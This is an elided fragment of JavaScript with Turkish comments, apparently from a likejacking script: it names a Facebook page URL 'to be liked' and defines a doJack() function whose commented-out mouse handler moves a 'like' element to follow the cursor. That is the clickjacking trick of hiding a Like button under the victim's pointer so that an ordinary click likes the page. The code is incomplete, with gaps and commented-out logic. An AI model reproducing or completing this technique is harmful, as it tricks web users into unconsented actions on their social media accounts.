...
var sayfa = "http://www.facebook.com/shedower1"; // Begenilecek
// facebook
// sayfasi
// url'si
...
function doJack() {
	...
	function mouseMove(e) {
		/*
		 * if (IE) { tempX = event.clientX + document.body.scrollLeft; tempY =
		 * event.clientY + document.body.scrollTop; } else { tempX = e.pageX;
		 * tempY = e.pageY; }
		 * 
		 * if (tempX < 0) tempX = 0; if (tempY < 0) tempY = 0;
		 * 
		 * like.style.top = (tempY - 5) + 'px'; like.style.left = (tempX - 5) +
		 * 'px';
		 */
